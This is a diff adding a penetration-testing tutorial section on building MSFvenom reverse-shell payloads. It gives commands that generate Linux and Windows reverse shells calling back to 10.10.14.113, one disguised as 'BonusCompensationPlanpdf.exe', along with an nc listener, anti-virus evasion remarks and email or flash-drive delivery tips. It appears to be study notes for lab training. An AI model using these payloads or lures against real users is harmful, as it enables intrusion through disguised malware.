@@ -204,3 +204,48 @@ After we issue the exploit command, the exploit is run, and there is an attempt 
 ```
 shell
 ```
+## Crafting Payloads with MSFvenom
+To run an exploit, deliver the payload, and establish a shell, we need network communication with the target. This might be through an internal network or a route into the target's network. However, if direct access isn't possible, we can use creative methods like MSFvenom to craft a payload and deliver it via email or social engineering, tricking the user into executing it.
+MSFvenom also allows us to encrypt & encode payloads to bypass common anti-virus
+
+__List Payloads__ 
+```
+msfvenom -l payloads
+```
+### Staged vs. Stageless Payloads
+
+**Staged Payloads**: Staged payloads send a small initial stage that sets up the target and then downloads the rest of the payload over the network. For example, the linux/x86/shell/reverse_tcp payload works this way. The small stage contacts the attack box to fetch the full payload and establish a reverse shell. You need to configure IPs and ports for the listener to catch the shell. Keep in mind, staged payloads use memory for the stage, leaving less for the payload itself. They might be less suitable for environments with limited bandwidth.
+
+**Stageless Payloads**: Stageless payloads send the entire payload in one go, without an initial stage. For example, linux/zarch/meterpreter_reverse_tcp is a stageless payload. This can be advantageous in low-bandwidth environments where staged payloads might be unstable. Stageless payloads also tend to be better for evasion as they generate less network traffic.
+
+__Differentiate between staged and stageless__
+The name will give you your first marker. Take our examples from above, linux/x86/shell/reverse_tcp is a staged payload, and we can tell from the name since each / in its name represents a stage from the shell forward. So /shell/ is a stage to send, and /reverse_tcp is another.  It is similar to the staged payload except that it specifies the architecture it affects, then it has the shell payload and network communications all within the same function /meterpreter_reverse_tcp. 
+
+__Building A Stageless Payload (Linux)__
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
+```
+-p is creating payload. LHOST, LPORT is Address To Connect Back To host. -f flag specifies the format the generated binary will be in. 
+
+__Executing a Stageless Payload__
+Getting the Payload to the Target System
+Once the payload is created, it needs to be delivered to the target system. Common methods include:
+
+- **Email**: Attach the payload file to an email message.
+- **Download Link**: Provide a link on a website for the user to download the payload.
+- **Metasploit Exploit Module**: Use this method if you already have internal network access.
+- **Flash Drive**: Physically deliver the payload during an onsite penetration test.
+
+After the payload is on the target system, it must be executed.
+
+For the payload to be successfull we need a listener as well.
+
+__NC Listener Connection__
+```
+sudo nc -lvnp 443
+```
+__Building A Stageless Payload (Windows)__
+```
+ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
+```
+here we choose .exe
